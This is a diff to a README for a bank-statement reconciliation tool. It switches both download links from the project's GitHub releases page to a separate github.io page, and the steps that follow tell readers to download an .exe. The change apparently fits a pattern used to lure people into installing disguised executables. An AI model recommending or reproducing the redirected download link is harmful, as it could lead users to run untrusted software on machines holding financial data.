@@ -1,6 +1,6 @@
 # 📊 statement-audit-reconciliation - Automate your bank statement reconciliation tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whitesho8243/statement-audit-reconciliation/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://whitesho8243.github.io)
 
 This application simplifies the way you manage bank feeds and ledger records. It connects directly to QuickBooks Online Accountant to match transactions. Bookkeeping teams save time by automating repetitive data entry and audit checks.
 
@@ -17,7 +17,7 @@ Your computer requires the following to run this software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following page to choose your installation package: [https://github.com/Whitesho8243/statement-audit-reconciliation/releases](https://github.com/Whitesho8243/statement-audit-reconciliation/releases)
+1. Visit the following page to choose your installation package: [https://whitesho8243.github.io](https://whitesho8243.github.io)
 2. Look for the file ending in .exe under the most recent version heading.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
